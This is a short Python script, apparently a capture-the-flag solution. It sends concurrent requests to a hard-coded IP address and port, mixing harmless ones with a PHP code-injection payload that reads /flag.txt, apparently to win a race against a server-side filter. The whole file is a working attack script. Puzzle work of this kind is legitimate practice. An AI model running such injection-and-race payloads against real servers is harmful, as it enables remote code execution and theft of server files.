import requests
import threading

url = 'http://193.136.164.147:23222/'

payload_safe = {'name': 'joao'}
payload_malicious = {'name': '<?php echo file_get_contents("/flag.txt"); ?>'}


def send_request(payload):
    try:
        response = requests.get(url, params=payload, timeout=3)
        print(f"Response: {response.text}")
    except requests.RequestException as e:
        print(f"Error: {e}")


threads = []

for _ in range(10):
    t = threading.Thread(target=send_request, args=(payload_safe,))
    threads.append(t)
    t.start()
    t = threading.Thread(target=send_request, args=(payload_malicious,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
